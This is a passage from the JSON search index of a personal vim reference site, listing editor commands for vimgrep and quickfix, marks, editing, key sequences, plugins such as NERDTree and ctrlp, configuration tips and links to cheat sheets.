vim's quickfix list. see vimcasts#44 for introduction: http://vimcasts.org/episodes/search-multiple-files-with-vimgrep/ :vimgrep / regex /g % Search for regex with multiple occasions per line (g) in current file (%) :vimgrep / C-r // % On the command line, C-r / (that is: CTRL-R followed by /) will insert the last search pattern. :vimgrep / a /g filelist Search in the given files ( filelist ) :vimgrep / a /g *.cc Search in all *.cc files current directory :vimgrep / a /g **/*.cc Search in all *.cc files in every sub-directory (recursively) :vimgrep / a /g `find . -type f` Search in all files that are returns by the backtick command. :vim short for :vimgrep :cnext Jump to next record/match in quickfix list :cprev Jump to previous record/match in quickfix list Unimpaired plugin (https://github.com/tpope/vim-unimpaired) provides the following mappings: [q see :cprev ]q see :cnext [Q see :cfirst ]Q see :clast see also: http://usevim.com/2012/08/24/vim101-quickfix/ and http://vimdoc.sourceforge.net/htmldoc/quickfix.html","title":"vimgrep and quickfix list"},{"location":"tools/vim/#marks","text":"Mark a position in a buffer and jump back to it. see also http://vim.wikia.com/wiki/Using_marks ma set mark a at current cursor location 'a jump to line of mark a (first non-blank character in line) `a jump to position (line and column) of mark a d'a delete from current line to line of mark a d`a delete from current cursor position to position of mark a c'a change text from current line to line of mark a y`a yank text to unnamed buffer from cursor to position of mark a :marks list all the current marks :marks aB list marks a, B (text is copied from link above)","title":"Marks"},{"location":"tools/vim/#editing","text":"x Delete char UNDER cursor X Delete char BEFORE cursor #x Delete the next # chars. starting from char under cursor dw Delete next word dW Delete UP TO the next word d^ Delete up unto the beginning of the line d$ Delete until end of the line D See d$, delete until end of the line dd Delete whole line dib Delete contents in parenthesis '(' ')' block (e.g. function args) diB Delete inner '{' '}' block daB Delete a '{' '}' block das Delete a senctence diw Delete word under cursor df c Delete until next occurence of c (char) found (including c ) [in single line] dt c Delete until next occurence of c (char) found (without c !!!) [in single line] ciw Change word under cursor ciB Change inner '{' '}' block cf c See df c but change instead of delete ct c See dt c but change instead of delete #J Merge # number of lines together gq (in visual-mode) format selected text according to line-width gqq format current line according to line-width #gqq format next #-lines C-n Keyword completion Tab Keyword completion (SuperTab plugin) r c Replace char c #r c Replace follow # chars with c , : csock, cursor on s, 3re ceeek :s/xxx/yyy/ Replace xxx with yyy at the first occurrence :s/xxx/yyy/g Replace xxx with yyy first occurrence, global (whole sentence) :s/xxx/yyy/gc Replace xxx with yyy global with confirm :%s/xxx/yyy/g Replace xxx with yyy global in the whole file u Convert selection (visual mode) to lowercase U Convert selection (visual mode) to uppercase :g/^#/d Delete all lines that begins with # :g/^$/d Delete all lines that are empty","title":"Editing"},{"location":"tools/vim/#misc","text":"ga Show ASCII of char under cursor","title":"Misc"},{"location":"tools/vim/#key-sequences","text":"","title":"Key sequences"},{"location":"tools/vim/#replace-a-word-in-a-number-of-occurrences-with-bar-use-word-under-cursor-or-foo","text":"* cw bar ESC n . * word under cursor 'foo' cw change word (enter insert mode) bar typed new word 'bar' ESC exit insert mode n next occurrence . repeat previous command","title":"Replace a word in a number of occurrences with 'bar'; use word under cursor (* or /foo)"},{"location":"tools/vim/#insert-3-times-help-help-help-help","text":"3i Help!_ ESC","title":"Insert 3 times \"Help!\": Help! Help! Help!"},{"location":"tools/vim/#insert-previously-yanked-text-in-line-after-current","text":"oESCp","title":"Insert previously yanked text in line after current"},{"location":"tools/vim/#search-for-selected-text","text":"select y / C-r0 select Select text in VISUAL mode (v) y Yank selection / Search for C-r0 Press Ctrl-R and 0 to paste in","title":"Search for selected text"},{"location":"tools/vim/#comment-out-selection","text":"C-v select # ESC ESC C-v Enter VISUAL block mode sel Select lines # Comment char for programming language (perl, python, bash, etc) ESC Exit ESC Completes adding comment char for previous selected block","title":"Comment out selection"},{"location":"tools/vim/#abbreviations","text":"auto correction of frequently misspelled words. :abbr Lunix Linux :abbr accross across :abbr hte the","title":"Abbreviations"},{"location":"tools/vim/#configuration","text":"If you set the incsearch option, Vim will show the first match for the pattern, while you are still typing it. This quickly shows a typo in the pattern. If you set the hlsearch option, Vim will highlight all matches for the pattern with a yellow background. This gives a quick overview of where the search command will take you. In program code it can show where a variable is used. You don't even have to move the cursor to see the matches.","title":"Configuration"},{"location":"tools/vim/#nerd-tree","text":"https://github.com/scrooloose/nerdtree/blob/master/doc/NERD_tree.txt F3 Toogle NERD-Tree visible","title":"NERD-tree"},{"location":"tools/vim/#ctrlpvim","text":"https://github.com/kien/ctrlp.vim C-p Open ctrlp window (alternative :CtrlP) :CtrlP d Open CtrlP with specific d = directory C-b Change mode: mru (most recent used) | buffers | files","title":"ctrlp.vim"},{"location":"tools/vim/#formating","text":"Use gq (see Editing section) for formating lines according to configured line-width. For C++ formating using clang-format see https://github.com/rhysd/vim-clang-format","title":"Formating"},{"location":"tools/vim/#links","text":"","title":"Links"},{"location":"tools/vim/#cheat-sheets","text":"http://www.worldtimzone.com/res/vi.html http://www.fprintf.net/vimCheatSheet.html https://wiki.archlinux.org/index.php/Vim http://www.fprintf.net/vimCheatSheet.html Yet Another Vim Cheat Sheet","title":"Cheat sheets"},{"location":"tools/vim/#articles","text":"Seven habits of effective text editing: http://www.moolenaar.net/habits.html Vim After 11 Years: http://statico.github.com/vim.html Coming Home to Vim: http://stevelosh.com/blog/2010/09/coming-home-to-vim","title":"Articles"},{"location":"tools/vim/#tipps-and-tricks","text":"vimcasts.org Video-casts on vim usevim.com Plugin introductions and useful tipps vimregex.com Infos about vims regex engine Productive vim shortcuts http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim 100 Vim commands every programmer should know http://www.catswhocode.com/blog/100-vim-commands-every-programmer-should-know VimGenius Interactive vim lesson, with some muscle learn potential Best of VimTips zzapper 15 Years of Vi + 8+ years of Vim and still learning http://rayninfo.co.uk/vimtips.html Use ag (silver searcher) as an indexer for Ctrl-P; and py-matcher for ctrl-p matching function: http://blog.patspam.com/2014/super-fast-ctrlp Command-T authors cheatsheet https://takac.github.io/2013/01/30/vim-grammar/","title":"tipps and tricks"},{"location":"tools/vim/#plugins","text":"NERDTree NERDCommenter Ctrl-P easytags unimpard supertab tagbar omnicomplete (C++)","title":"Plugins"},{"location":"tools/vim/#themes","text":"zenburn tango","title":"Themes"},{"location":"tools/vim/#color-column","text":"activate colorcolumn: http://stackoverflow.com/questions/1919028/how-to-show-vertical-line-to-wrap-the-line-in-vim set color: http://choorucode.wordpress.com/2011/07/29/vim-set-color-of-colorcolumn/ :set colorcolumn=81 highlight ColorColumn ctermbg=8 Source Updated 22 July 2019","title":"Color column"}]}